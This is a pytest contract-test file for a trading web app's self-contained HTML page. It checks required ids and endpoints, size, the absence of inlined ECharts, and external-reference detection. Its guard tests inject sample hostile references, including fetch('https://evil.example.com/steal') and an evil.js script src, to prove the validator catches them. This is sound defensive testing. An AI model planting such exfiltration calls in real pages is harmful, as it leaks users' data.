"""W4 前端契约测试：``ptrade/webui.py`` 的 ``APP_HTML``。

覆盖 ``.omx/plans/test-spec-ptrade-web.md`` §5 的 U1–U4，并额外加**非空洞守卫**：
U1–U4 若被写成"永远为真"的断言就没有意义，因此本文件同时用「注坏 → 必须变红」的
夹具证明每条断言真的能失败（见 ``test_u1_guard_*`` / ``test_u2_guard_*`` /
``test_u4_guard_*``）。

不依赖任何服务端：全部是对字符串的结构断言（W3 的 ``webapp.py`` 尚未落盘）。
"""

from __future__ import annotations

import re
from pathlib import Path

import pytest

from ptrade.chart import external_refs, no_external_refs
from ptrade.webui import APP_HTML

ROOT = Path(__file__).resolve().parents[1]

#: PRD §5.5 冻结的必需元素 id（一个都不能少）
REQUIRED_IDS = (
    "state-panel",
    "positions",
    "risk",
    "search-box",
    "search-results",
    "watchlist",
    "score-table",
    "chart-frame",
    "order-form",
    "settle-btn",
    "toast",
)

#: PRD §5.4 冻结的端点（前端必须按这些路径对接）
REQUIRED_ENDPOINTS = (
    "/api/health",
    "/api/state",
    "/api/positions",
    "/api/risk",
    "/api/search",
    "/api/watchlist",
    "/api/watchlist/score",
    "/api/score",
    "/api/order",
    "/api/close",
    "/api/settle",
    "/api/chart",
)

#: 六种交易方向（core.Side 的值）
REQUIRED_SIDES = ("buy", "sell", "margin_buy", "short_sell", "buy_to_cover", "repay_margin")

MAX_BYTES = 200 * 1024


# ─────────────────────────── U1：外链为 0（INV-42） ───────────────────────────

def test_u1_no_external_refs() -> None:
    """INV-42：复用既有校验器，任何非 data:/javascript:/# 的资源引用都算外链。"""
    refs = external_refs(APP_HTML)
    assert refs == [], f"APP_HTML 不得含外链引用（INV-42），实测命中：{refs}"
    assert no_external_refs(APP_HTML) is True


def test_u1_guard_script_src_is_caught() -> None:
    """非空洞守卫：塞一个真外链 ``<script src>`` → U1 必须变红。"""
    broken = APP_HTML.replace("<script>", '<script src="https://cdn.example.com/evil.js">', 1)
    assert broken != APP_HTML
    assert no_external_refs(broken) is False
    assert any("script src" in r for r in external_refs(broken))


def test_u1_guard_iframe_src_is_caught() -> None:
    """非空洞守卫：``<iframe src="https://…">`` 必须被抓（媒体 src 类别）。"""
    broken = APP_HTML.replace(
        '<iframe id="chart-frame" title="K 线图"></iframe>',
        '<iframe id="chart-frame" src="https://evil.example.com/x.html"></iframe>',
        1,
    )
    assert broken != APP_HTML
    assert no_external_refs(broken) is False


def test_u1_guard_relative_css_url_is_caught() -> None:
    """非空洞守卫：**相对路径**也算外链（单文件产物一旦引用外部资源就不自包含）。"""
    broken = APP_HTML.replace("<style>", "<style>body{background:url(/static/bg.png)}", 1)
    assert no_external_refs(broken) is False
    assert any("css url()" in r for r in external_refs(broken))


def test_u1_guard_not_vacuous_when_no_script() -> None:
    """``_strip_script_bodies`` 只剥内容、保留开标签；顺带证明 APP_HTML 真有 ``<script>``。"""
    assert "<script" in APP_HTML, "U1 的 JS 网络调用扫描需要真实 <script> 块，否则守卫空洞"
    assert "fetch(" in APP_HTML, "前端必须用 fetch 调 API（否则页面无法工作）"


def test_u1_guard_js_literal_external_fetch_is_caught() -> None:
    """非空洞守卫：JS 里字面量 ``fetch("https://…")`` 必须被抓（JS 网络调用类别）。"""
    broken = APP_HTML.replace("fetch(", 'fetch("https://evil.example.com/steal") || fetch(', 1)
    assert no_external_refs(broken) is False
    assert any("js network call" in r for r in external_refs(broken))


def test_iframe_src_is_set_at_runtime_not_in_markup() -> None:
    """K 线图必须走运行时赋值：静态 ``<iframe>`` 不带 ``src``（否则相对路径也算外链）。"""
    match = re.search(r"<iframe\b[^>]*>", APP_HTML)
    assert match is not None, "缺少 <iframe id=\"chart-frame\">"
    assert "src=" not in match.group(0), "静态 <iframe> 不得带 src（会触发 INV-42）"
    assert "CHART_FRAME.src" in APP_HTML, "必须在 JS 里给 iframe 赋 src"


# ─────────────────────── U2：必需 id 全在（逐个断言） ───────────────────────

@pytest.mark.parametrize("element_id", REQUIRED_IDS)
def test_u2_required_id_present(element_id: str) -> None:
    assert f'id="{element_id}"' in APP_HTML, f"缺少必需元素 id=#{element_id}（PRD §5.5）"


def test_u2_all_ids_count() -> None:
    found = sorted(set(re.findall(r'id="([^"]+)"', APP_HTML)))
    missing = [i for i in REQUIRED_IDS if i not in found]
    assert not missing, f"缺 id：{missing}"


def test_u2_guard_id_check_can_fail() -> None:
    """非空洞守卫：删掉一个 id → 断言必须变红。"""
    broken = APP_HTML.replace('id="toast"', 'id="toast-x"', 1)
    assert broken != APP_HTML
    assert 'id="toast"' not in broken
    with pytest.raises(AssertionError):
        assert 'id="toast"' in broken, "缺少必需元素 id=#toast"


# ───────────────────────── U3：体积受控（< 200 KB） ─────────────────────────

def test_u3_size_under_limit() -> None:
    size = len(APP_HTML.encode("utf-8"))
    assert size < MAX_BYTES, f"APP_HTML 体积 {size} 字节 ≥ {MAX_BYTES}（不得内联 ECharts 本体）"
    assert size > 4096, "体积过小，疑似生成的 HTML 不完整"


# ─────────────────── U4：不含内联 ECharts 指纹（防塞两遍） ───────────────────

def test_u4_no_inlined_echarts() -> None:
    assert "echarts" not in APP_HTML.lower(), (
        "APP_HTML 不得内联或引用 ECharts：K 线图由 GET /api/chart 返回完整 HTML，用 iframe 承载"
    )
    assert "echarts.min.js" not in APP_HTML


def test_u4_guard_vendor_fingerprint_absent() -> None:
    """若 vendored ECharts 存在，它的内容指纹必须不在 APP_HTML 里（注坏即红）。"""
    vendor = ROOT / "ptrade" / "vendor" / "echarts.min.js"
    if not vendor.exists():
        pytest.skip("ptrade/vendor/echarts.min.js 未落盘（W3/chart 侧），跳过指纹比对")
    text = vendor.read_text(encoding="utf-8", errors="ignore")
    marker = "".join(ch for ch in text[:4000] if not ch.isspace())[:200]
    assert marker, "无法提取 ECharts 指纹"
    assert marker not in APP_HTML, "APP_HTML 疑似内联了 ECharts 本体"


def test_u4_guard_echarts_injection_is_caught() -> None:
    broken = APP_HTML + "\n<script>window.echarts = {};</script>\n"
    with pytest.raises(AssertionError):
        assert "echarts" not in broken.lower(), "注入 ECharts 后必须变红"


# ───────────────── 对接契约：端点 / 方向 / 错误语义 / 二次确认 ─────────────────

@pytest.mark.parametrize("endpoint", REQUIRED_ENDPOINTS)
def test_js_references_every_endpoint(endpoint: str) -> None:
    assert endpoint in APP_HTML, f"前端缺少端点对接：{endpoint}"


def test_all_six_sides_available() -> None:
    form = APP_HTML.split('id="order-form"')[1].split("</form>")[0]
    for side in REQUIRED_SIDES:
        assert f'value="{side}"' in form, f"下单表单缺少方向 {side}"


def test_business_rejection_is_not_reported_as_failure() -> None:
    """业务拒单 = HTTP 200 + ok=true + orders[].status=="rejected"，必须显示 error_code。"""
    assert "rejected" in APP_HTML
    assert "error_code" in APP_HTML
    assert "业务拒单" in APP_HTML, "必须把业务拒单与「请求失败」区分开"


def test_http_error_semantics_covered() -> None:
    assert "503" in APP_HTML and "锁" in APP_HTML, "必须提示写锁超时（HTTP 503）"
    assert "400" in APP_HTML, "必须提示参数非法（HTTP 400）"


def test_write_operations_require_confirmation() -> None:
    """下单 / 平仓 / 结算 都要二次确认。"""
    assert "confirmWrite" in APP_HTML
    assert APP_HTML.count("confirmWrite(") >= 5, "三处写操作（下单/平仓/结算）+ 自选池删除+批量打分 都需确认"
    for label in ("下单：", "平仓 ", "结算到 "):
        assert label in APP_HTML, f"缺少二次确认文案：{label}"


def test_chinese_ui() -> None:
    cjk = re.findall(r"[\u4e00-\u9fff]", APP_HTML)
    assert len(cjk) >= 100, "界面文案应为中文"
